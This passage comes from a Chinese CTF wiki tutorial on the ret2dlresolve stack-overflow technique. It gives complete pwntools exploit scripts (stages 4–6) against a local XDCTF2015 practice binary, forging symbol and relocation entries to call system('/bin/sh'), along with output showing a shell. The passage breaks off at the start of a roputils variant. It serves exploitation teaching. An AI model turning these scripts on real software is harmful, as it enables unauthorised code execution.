<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;main&#39;</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
<span class="n">bss_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span>

<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="c1">## stack privot to bss segment</span>
<span class="c1">## new stack size is 0x800</span>
<span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
<span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
<span class="c1">### padding</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">)</span>
<span class="c1">### read 100 byte to base_stage</span>
<span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="c1">### stack privot, set esp = base_stage</span>
<span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>

<span class="c1">## write sh=&quot;/bin/sh&quot;</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>

<span class="n">plt0</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.plt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">rel_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.rel.plt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">dynsym</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.dynsym&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">dynstr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.dynstr&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>

<span class="c1">### making fake write symbol</span>
<span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">32</span>
<span class="n">align</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
                <span class="p">)</span>  <span class="c1"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span>
<span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="n">align</span>
<span class="n">index_dynsym</span> <span class="o">=</span> <span class="p">(</span>
    <span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x10</span>  <span class="c1"># calculate the dynsym index of write</span>
<span class="n">fake_write_sym</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="mh">0x4c</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">])</span>

<span class="c1">### making fake write relocation</span>

<span class="c1">## making base_stage+24 ---&gt; fake reloc</span>
<span class="n">index_offset</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">24</span> <span class="o">-</span> <span class="n">rel_plt</span>
<span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
<span class="n">r_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">index_dynsym</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span>
<span class="n">fake_write_reloc</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">write_got</span><span class="p">,</span> <span class="n">r_info</span><span class="p">])</span>

<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">plt0</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
<span class="c1">## fake ret addr of write</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sh</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">fake_write_reloc</span><span class="p">)</span>  <span class="c1"># fake write reloc</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">align</span><span class="p">)</span>  <span class="c1"># padding</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">fake_write_sym</span><span class="p">)</span>  <span class="c1"># fake write symbol</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>

<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
<p>具体效果如下</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  ret2dlresolve git:(master) ✗ python stage4.py
[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process &#39;./main&#39;: pid 128795
[*] Loaded cached gadgets for &#39;./main&#39;
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
</pre></div>
</div>
</div>
<div class="section" id="stage-5">
<h5>stage 5<a class="headerlink" href="#stage-5" title="永久链接至标题">¶</a></h5>
<p>这一阶段，我们将在阶段4的基础上，我们进一步使得write符号的st_name指向我们自己构造的字符串。</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;main&#39;</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
<span class="n">bss_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span>

<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="c1">## stack privot to bss segment</span>
<span class="c1">## new stack size is 0x800</span>
<span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
<span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
<span class="c1">### padding</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">)</span>
<span class="c1">### read 100 byte to base_stage</span>
<span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="c1">### stack privot, set esp = base_stage</span>
<span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>

<span class="c1">## write sh=&quot;/bin/sh&quot;</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>

<span class="n">plt0</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.plt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">rel_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.rel.plt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">dynsym</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.dynsym&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">dynstr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.dynstr&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>

<span class="c1">### making fake write symbol</span>
<span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">32</span>
<span class="n">align</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
                <span class="p">)</span>  <span class="c1"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span>
<span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="n">align</span>
<span class="n">index_dynsym</span> <span class="o">=</span> <span class="p">(</span>
    <span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x10</span>  <span class="c1"># calculate the dynsym index of write</span>
<span class="c1">## plus 10 since the size of Elf32_Sym is 16.</span>
<span class="n">st_name</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="n">dynstr</span>
<span class="n">fake_write_sym</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">st_name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">])</span>

<span class="c1">### making fake write relocation</span>

<span class="c1">## making base_stage+24 ---&gt; fake reloc</span>
<span class="n">index_offset</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">24</span> <span class="o">-</span> <span class="n">rel_plt</span>
<span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
<span class="n">r_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">index_dynsym</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span>
<span class="n">fake_write_reloc</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">write_got</span><span class="p">,</span> <span class="n">r_info</span><span class="p">])</span>

<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">plt0</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
<span class="c1">## fake ret addr of write</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sh</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">fake_write_reloc</span><span class="p">)</span>  <span class="c1"># fake write reloc</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">align</span><span class="p">)</span>  <span class="c1"># padding</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">fake_write_sym</span><span class="p">)</span>  <span class="c1"># fake write symbol</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;write</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># there must be a \x00 to mark the end of string</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>

<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
<p>效果如下</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  ret2dlresolve git:(master) ✗ python stage5.py
[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process &#39;./main&#39;: pid 129249
[*] Loaded cached gadgets for &#39;./main&#39;
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
</pre></div>
</div>
</div>
<div class="section" id="stage-6">
<h5>stage 6<a class="headerlink" href="#stage-6" title="永久链接至标题">¶</a></h5>
<p>这一阶段，我们只需要将原先的write字符串修改为system字符串，同时修改write的参数为system的参数即可获取shell。这是因为，dl_resolve最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;main&#39;</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
<span class="n">bss_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span>

<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="c1">## stack privot to bss segment</span>
<span class="c1">## new stack size is 0x800</span>
<span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
<span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
<span class="c1">### padding</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">)</span>
<span class="c1">### read 100 byte to base_stage</span>
<span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="c1">### stack privot, set esp = base_stage</span>
<span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>

<span class="c1">## write sh=&quot;/bin/sh&quot;</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>

<span class="n">plt0</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.plt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">rel_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.rel.plt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">dynsym</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.dynsym&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">dynstr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.dynstr&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>

<span class="c1">### making fake write symbol</span>
<span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">32</span>
<span class="n">align</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
                <span class="p">)</span>  <span class="c1"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span>
<span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="n">align</span>
<span class="n">index_dynsym</span> <span class="o">=</span> <span class="p">(</span>
    <span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x10</span>  <span class="c1"># calculate the dynsym index of write</span>
<span class="c1">## plus 10 since the size of Elf32_Sym is 16.</span>
<span class="n">st_name</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="n">dynstr</span>
<span class="n">fake_write_sym</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">st_name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">])</span>

<span class="c1">### making fake write relocation</span>

<span class="c1">## making base_stage+24 ---&gt; fake reloc</span>
<span class="n">index_offset</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">24</span> <span class="o">-</span> <span class="n">rel_plt</span>
<span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
<span class="n">r_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">index_dynsym</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span>
<span class="n">fake_write_reloc</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">write_got</span><span class="p">,</span> <span class="n">r_info</span><span class="p">])</span>

<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">plt0</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
<span class="c1">## fake ret addr of write</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">82</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">fake_write_reloc</span><span class="p">)</span>  <span class="c1"># fake write reloc</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">align</span><span class="p">)</span>  <span class="c1"># padding</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">fake_write_sym</span><span class="p">)</span>  <span class="c1"># fake write symbol</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;system</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># there must be a \x00 to mark the end of string</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="nb">print</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">()</span>
<span class="nb">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">sh</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>

<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
<p>需要注意的是，这里我’/bin/sh’的偏移我修改为了82，这是因为pwntools中它会自动帮你对齐字符串。。。下面这一行说明了问题。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x0050</span><span class="p">:</span>           <span class="s1">&#39;aara&#39;</span>
</pre></div>
</div>
<p>效果如下</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  ret2dlresolve git:(master) ✗ python stage6.py
[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process &#39;./main&#39;: pid 130415
[*] Loaded cached gadgets for &#39;./main&#39;
0x0000:        0x8048380
0x0004:           0x2528
0x0008:           &#39;bbbb&#39; &#39;bbbb&#39;
0x000c:        0x804a892
0x0010:           &#39;bbbb&#39; &#39;bbbb&#39;
0x0014:           &#39;bbbb&#39; &#39;bbbb&#39;
0x0018: &#39;\x1c\xa0\x04\x08&#39; &#39;\x1c\xa0\x04\x08\x07i\x02\x00&#39;
0x001c:  &#39;\x07i\x02\x00&#39;
0x0020:           &#39;aaaa&#39; &#39;aaaaaaaa&#39;
0x0024:           &#39;aaaa&#39;
0x0028:  &#39;\x00&amp;\x00\x00&#39; &#39;\x00&amp;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00&#39;
0x002c: &#39;\x00\x00\x00\x00&#39;
0x0030: &#39;\x00\x00\x00\x00&#39;
0x0034: &#39;\x12\x00\x00\x00&#39;
0x0038:           &#39;syst&#39; &#39;system\x00&#39;
0x003c:        &#39;em\x00o&#39;
0x0040:             &#39;aa&#39;
0x0044:           &#39;aaaa&#39; &#39;aaaaaaaaaaaaaa&#39;
0x0048:           &#39;aaaa&#39;
0x004c:           &#39;aaaa&#39;
0x0050:           &#39;aara&#39;
82
[*] Switching to interactive mode
/bin/sh: 1: xa: not found
$ ls
core  main.c     stage2.py  stage4.py  stage6.py
main  stage1.py  stage3.py  stage5.py
</pre></div>
</div>
</div>
</div>
<div class="section" id="id5">
<h4>工具攻击<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<p>根据上面的介绍，我们应该很容易可以理解这个攻击了。下面我们直接使用roputil来进行攻击。代码如下</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">roputils</span> <span class="k">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="n">process</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="n">gdb</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="n">context</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
<span class="n">bss_base</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">section</span><span class="p">(</span><span class="s1">&#39;.bss&#39;</span><span class="p">)</span>
